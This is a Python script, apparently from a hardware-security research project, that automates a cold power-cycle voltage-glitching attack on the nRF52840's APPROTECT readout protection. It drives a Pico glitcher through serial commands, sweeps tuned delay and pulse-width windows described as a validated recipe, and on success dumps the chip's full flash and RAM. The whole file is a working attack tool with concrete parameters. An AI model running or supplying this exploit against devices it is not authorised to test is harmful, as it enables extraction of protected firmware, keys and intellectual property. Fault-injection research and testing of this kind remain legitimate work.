#!/usr/bin/env python3
"""
nrf_autopwn.py -- unattended, self-looping nRF52840 APPROTECT glitch autopwn run
(COLD POWER-CYCLE attack). Runs until UNLOCK (then INFO + full flash+RAM DUMP + exit)
or until killed. Wiring: ../NRF52840_WIRING_POWERCYCLE.md.

Same mechanism as nrf_attack.py but loops/rotates delay+width WINDOWS forever and
re-verifies the part is genuinely LOCKED (honest AHB read) before each batch by
power-cycling. Use this for hands-off runs; nrf_attack.py for a single sweep.

VALIDATED recipe (2026-06-02): WIDTH 225-265 cyc, DELAY 1065-1170 us after power-on,
OFF 18 ms. The WINDOWS below cover that. (History: 165-180 cyc / ~1770us app-start were
the OLD wrong guess — the one-shot boot needs a stronger pulse than the RAM harness.)

LAN scope (rigol_scope_live.py) can run in parallel -- this only uses the Pico serial.

Examples:
  ./nrf_autopwn.py                              # unattended: rotate windows until unlock, then dump
  ./nrf_autopwn.py --tries-per-batch 30000      # more attempts per window before rotating
  ./nrf_autopwn.py --pico-port /dev/ttyACM0 --out fw.bin
"""
import argparse
import os
import sys
import time

from nrf_attack import Pico, find_port   # reuse serial helpers
from nrf_recovery import (parse_hexdump, run_recovery, dump_flash_and_ram,
                          project_path, unique_dump_path, pretty_info)
from colors import hdr, ok, warn, err, info, dim, green, strip, ColorHelpFormatter

HERE = os.path.dirname(os.path.abspath(__file__))   # this script's dir (no hardcoded path)


class _Tee:
    """Mirror every print to real stdout AND a flushed file, so progress is visible
    regardless of how the harness buffers a background task's stdout. ANSI color is
    kept for a TTY stream and stripped for the log file."""
    def __init__(self, *streams):
        self.streams = streams
    def write(self, s):
        for st in self.streams:
            try:
                tty = getattr(st, "isatty", lambda: False)()
                st.write(s if tty else strip(s)); st.flush()
            except Exception:
                pass
    def flush(self):
        for st in self.streams:
            try:
                st.flush()
            except Exception:
                pass

# (d_start, d_end, d_step, w_start, w_end, w_step) -- rotated in order, forever.
# VALIDATED 2026-06-02: the cold power-cycle attack unlocks at DELAY 1065-1170us (broad
# window; app-start ~1271us, read precedes it) and WIDTH 225-265 cyc (the one-shot locked
# boot needs a stronger pulse than the RAM-harness 165-180 band -- that was a red herring).
WINDOWS = [
    (1050, 1350, 3, 225, 265, 2),   # wide blind sweep over the validated delay x width box
    (1060, 1175, 2, 250, 268, 2),   # tighter core around the hit cluster (delay ~1065-1170, width ~255-265)
]


def wait_idle(p, quiet_s=2.5, max_s=2400):
    """Block until the firmware CLI is idle. A running TARGET GLITCH APPROTECT sweep
    cannot be aborted in software (no FTDI-DTR reset line here), and it streams ~16
    '[SWD] Connected' lines/s, so 'no bytes for quiet_s' reliably means it finished
    and is back at the prompt. Prevents the campaign colliding with a leftover sweep."""
    print(dim("[autopwn] waiting for CLI idle (a prior on-device sweep may still be running)..."))
    start = time.time(); last = time.time()
    while time.time() - start < max_s:
        n = p.s.in_waiting
        if n:
            p.s.read(n); last = time.time()
        else:
            if time.time() - last > quiet_s:
                print(dim(f"[autopwn] CLI idle after {int(time.time()-start)}s."))
                return True
            time.sleep(0.1)
    print(warn("[autopwn] WARN: CLI never went idle; starting anyway."))
    return False


def run_batch(p, params, max_secs):
    """Send one APPROTECT sweep, stream until its verdict. Returns 'unlock'|'done'|'timeout'."""
    p.send(f"TARGET GLITCH APPROTECT {params}")
    start = time.time(); buf = b""; unlocked = False; n_disrupt = 0
    while time.time() - start < max_secs:
        n = p.s.in_waiting
        if n:
            buf += p.s.read(n)
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                t = line.decode("utf-8", "replace").rstrip()
                if not t or t.startswith("[SWD] Connected"):
                    continue                       # skip per-attempt connect spam
                if "DISRUPT" in t:
                    n_disrupt += 1
                if "attempt " in t and "/" in t:    # periodic progress line
                    print("   " + t)
                if "UNLOCKED" in t:
                    print("   " + t); unlocked = True
                if "did not unlock" in t or "No unlock" in t or "SUCCEEDED" in t:
                    return ("unlock" if unlocked else "done"), n_disrupt
                if "UNLOCKED" in t:
                    return "unlock", n_disrupt
        else:
            time.sleep(0.05)
    return "timeout", n_disrupt


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=ColorHelpFormatter)
    ap.add_argument("--pico-port", default=None, help="Pico CDC port (default: auto-detect)")
    ap.add_argument("--tries-per-batch", dest="tries", type=int, default=15000,
                    help="attempts per window before rotating to the next")
    ap.add_argument("--off", type=int, default=18, help="target power-off time per attempt, ms (18 = full rail discharge)")
    ap.add_argument("--settle", type=int, default=4, help="wait after glitch before SWD probe, ms")
    ap.add_argument("--label", default="dongle",
                    help="target label -> dumps go to scripts/nrf52840/<label>/ (default: dongle for "
                         "this cold power-cycle attack). Keeps each target's dumps separate.")
    ap.add_argument("--out", default=None,
                    help="explicit flash dump path (default: a UNIQUE timestamped file under the "
                         "--label folder, so unlocks never overwrite prior findings)")
    ap.add_argument("--batch-max-secs", type=float, default=2000.0,
                    help="per-batch host watchdog timeout, s")
    ap.add_argument("--log", default=project_path("nrf_autopwn.log"),
                    help="progress log file (flushed; default: scripts/nrf52840/)")
    a = ap.parse_args()
    # Unique, target-scoped dump path so a successful dump NEVER overwrites old findings.
    if not a.out:
        a.out = unique_dump_path(a.label)
    elif os.path.dirname(a.out):
        os.makedirs(os.path.dirname(a.out), exist_ok=True)
    try:
        _lf = open(a.log, "a", buffering=1)
        _lf.write(f"\n===== autopwn start {time.strftime('%Y-%m-%d %H:%M:%S')} =====\n")
        sys.stdout = _Tee(_lf, sys.__stdout__)   # FILE first: guaranteed even if the harness stdout pipe blocks
    except Exception:
        pass

    port = find_port(a.pico_port)
    print(info(f"[pico] {port}"))
    p = Pico(port)
    wait_idle(p)                       # don't collide with a leftover on-device sweep
    p.cmd("TARGET NRF52840", 0.4)
    batch = 0; total_disrupt = 0; t0 = time.time()
    try:
        while True:
            d0, d1, ds, w0, w1, ws = WINDOWS[batch % len(WINDOWS)]
            batch += 1
            # re-lock the target each batch: a clean power-cycle re-locks it
            p.cmd("ARM OFF", 0.1)
            p.cmd("TARGET POWER OFF", 0.35); time.sleep(0.4)
            p.cmd("TARGET POWER ON", 0.35); time.sleep(0.4)
            st = p.cmd("TARGET NRF STATUS", 0.7)
            locked = "PROTECTED" in st and "UNPROTECTED" not in st
            params = f"{d0} {d1} {ds} {w0} {w1} {ws} {a.off} {a.settle} {a.tries}"
            elapsed = int(time.time() - t0)
            head = (f"=== batch {batch}  [{elapsed}s]  delay {d0}-{d1}/{ds} "
                    f"width {w0}-{w1}/{ws}  ({'locked' if locked else 'NOT LOCKED!'}) ===")
            print("\n" + (hdr(head) if locked else err(head)))
            print(dim(f">>> TARGET GLITCH APPROTECT {params}"))
            res, nd = run_batch(p, params, a.batch_max_secs)
            total_disrupt += nd
            print(dim(f"--- batch {batch}: {res}  (disrupts {nd}, total {total_disrupt}) ---"))
            if res == "unlock":
                print(ok("\n*** UNLOCKED -- reading flash + RAM ***"))
                print(pretty_info(p.cmd("TARGET NRF INFO", 1.2)))
                fn, rn, ram_out = dump_flash_and_ram(p, a.out)
                print(green(f"saved flash {fn} bytes -> {a.out}"))
                print(green(f"saved RAM {rn} bytes -> {ram_out}") if rn else warn("WARN: RAM dump 0 bytes"))
                # build-code-branched recovery: DRY-RUN only in the unattended autopwn run
                # (never auto-mutate the chip during an unwatched unlock).
                try:
                    run_recovery(p, apply=False)
                except Exception as e:
                    print(warn(f"[recovery] skipped: {e}"))
                print(ok(f"AUTOPWN SUCCESS after {batch} batches / {int(time.time()-t0)}s"))
                return
    except KeyboardInterrupt:
        print(warn("\n[autopwn] interrupted"))
    finally:
        p.close()


if __name__ == "__main__":
    main()
